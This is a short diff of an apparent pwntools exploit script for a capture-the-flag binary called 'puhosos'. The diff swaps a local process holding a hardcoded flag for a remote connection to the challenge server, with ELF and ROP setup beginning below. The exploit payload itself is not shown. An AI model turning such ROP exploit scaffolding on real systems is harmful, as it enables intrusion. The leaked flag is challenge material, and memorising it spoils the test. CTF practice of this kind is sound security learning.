@@ -14,8 +14,9 @@ def gen_password():
         
     return password
 
-env = {'FLAG': 'CTF{chief_puhosos_owned_the_stack_via_type_casting}'}
-p = process('./puhosos', env=env)
+# env = {'FLAG': 'CTF{}'}
+# p = process('./puhosos', env=env)
+p = remote("tasks.danissimurr.ru", 1337)
 
 elf = ELF('./puhosos')
 rop_elf = ROP(elf)
